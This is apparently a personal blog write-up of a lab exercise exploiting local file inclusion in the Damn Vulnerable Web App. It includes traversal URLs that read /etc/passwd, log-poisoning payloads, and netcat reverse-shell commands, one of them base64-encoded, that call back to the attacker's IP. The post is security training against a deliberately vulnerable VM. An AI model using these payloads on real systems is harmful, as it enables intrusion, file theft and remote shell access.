---
layout: post
title: Dam Vulnerable Web App Local File Inclusion
---

Exploiting the Dam Vulnerable Web App

On both low and medium security we can read files on the server.
# LOW

http://10.0.2.4/dvwa/vulnerabilities/fi/?page=include.php

http://10.0.2.4/dvwa/vulnerabilities/fi/include.php 
Navigating to this we can see that it is on the server.
```
﻿Fatal error: Call to undefined function dvwaExternalLinkUrlGet() in /var/www/dvwa/vulnerabilities/fi/include.php on line 15
```
Next we navigate to where the passwords would be stored on the server.
http://10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd 
```
﻿root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false snmp:x:115:65534::/var/lib/snmp:/bin/false
Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324

Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325

Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326
```

# MEDIUM
This also works on the medium level of security.
http://10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd
```
﻿root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false snmp:x:115:65534::/var/lib/snmp:/bin/false
Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324

Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325

Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326
```
Now with this we can upload a reverse shell.
http://10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../proc/self/environ
```
﻿REDIRECT_HANDLER=php5-cgiREDIRECT_STATUS=200HTTP_HOST=10.0.2.4HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5HTTP_ACCEPT_ENCODING=gzip, deflateHTTP_COOKIE=security=medium; PHPSESSID=827df7d864ba3fe1d3c7ddfcbcb9d493HTTP_CONNECTION=keep-aliveHTTP_UPGRADE_INSECURE_REQUESTS=1PATH=/usr/local/bin:/usr/bin:/binSERVER_SIGNATURE=Apache/2.2.8 (Ubuntu) DAV/2 Server at 10.0.2.4 Port 80 SERVER_SOFTWARE=Apache/2.2.8 (Ubuntu) DAV/2SERVER_NAME=10.0.2.4SERVER_ADDR=10.0.2.4SERVER_PORT=80REMOTE_ADDR=10.0.2.15DOCUMENT_ROOT=/var/www/SERVER_ADMIN=webmaster@localhostSCRIPT_FILENAME=/usr/lib/cgi-bin/phpREMOTE_PORT=35562REDIRECT_QUERY_STRING=page=/../../../../../proc/self/environREDIRECT_URL=/dvwa/vulnerabilities/fi/index.phpGATEWAY_INTERFACE=CGI/1.1SERVER_PROTOCOL=HTTP/1.1REQUEST_METHOD=GETQUERY_STRING=page=/../../../../../proc/self/environREQUEST_URI=/dvwa/vulnerabilities/fi/?page=/../../../../../proc/self/environSCRIPT_NAME=/cgi-bin/phpPATH_INFO=/dvwa/vulnerabilities/fi/index.phpPATH_TRANSLATED=/var/www/dvwa/vulnerabilities/fi/index.php
Warning: Cannot modify header information - headers already sent by (output started at /proc/10661/environ:1) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324

Warning: Cannot modify header information - headers already sent by (output started at /proc/10661/environ:1) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325

Warning: Cannot modify header information - headers already sent by (output started at /proc/10661/environ:1) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326
```
Navigating to this link with burp suite on we intercept it.
Looking at burp suite we can see the user-agent is Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 .
The same as the response we got on the web page previously.
If we modify the user agent and replace it with <?phpinfo();?> to test if we can execute php commands. 
We forward this and now we get a phpinfo page.

Now we listen on port 8888 with nc -vv -l -p 8888.
Then we replace the user-agent with <?passthru("nc -e /bin/sh 10.0.2.15 8888"); ?> to get a reverse shell by forwarding it with burp suite.

ssh random@10.0.2.4

﻿metasploitable sshd[10898]: Invalid user random from 10.0.2.15 Jul 23 11:51:50 metasploitable sshd[10898]: Failed none for invalid user random from 10.0.2.15 port 40146 ssh2 Jul 23 11:51:58 metasploitable 

Only 1 shot with this method

ssh "<?passthru('nc -e /bin/sh 10.0.2.15 8888'); ?>"@10.0.2.4

encode between the single quotes with base64 to make sure there arn’t any special characters to interfere with the bash. 

nc -e /bin/sh 10.0.2.15 8888 encoded into base64

bmMgLWUgL2Jpbi9zaCAxMC4wLjIuMTUgODg4OA==

ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxMC4wLjIuMTUgODg4OA==')); ?>"@10.0.2.4

nc -vv -l -p 8888

reloading this page 
http://10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth.log
we get access.


# HIGH

With high trying to access this link http://10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd results in file not found.


